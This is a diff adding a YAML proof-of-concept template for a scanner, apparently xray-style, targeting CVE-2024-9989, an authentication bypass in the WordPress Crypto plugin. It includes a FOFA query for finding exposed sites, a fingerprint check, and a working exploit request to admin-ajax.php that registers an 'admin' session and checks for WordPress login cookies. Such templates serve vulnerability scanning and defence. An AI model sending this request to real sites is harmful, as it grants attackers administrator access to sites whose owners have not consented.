@@ -1,0 +1,19 @@
+id: poc-yaml-wordpress-plugin-crypto-authentication-bypass
+info:
+  name: WordPress Plugin Crypto 绕过身份认证漏洞(CVE-2024-9989)
+  severity: critical
+  tags:
+  - 认证绕过
+  - CVE-2024-9989
+  finger: crypto
+  fofa: body="wp-content/plugins/crypto"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"/wp-content/plugins/crypto")
+- method: GET
+  path: /wp-admin/admin-ajax.php?action=crypto_connect_ajax_process&method_name=register&param1=admin
+  expression: status_code == 200 && contains(body,"\"error\":false") && contains(body,"success")
+    && !contains(body,"<") && contains(headers,"wordpress_sec_") && contains(headers,"wordpress_logged_in_")
+variables: {}
+transport: http
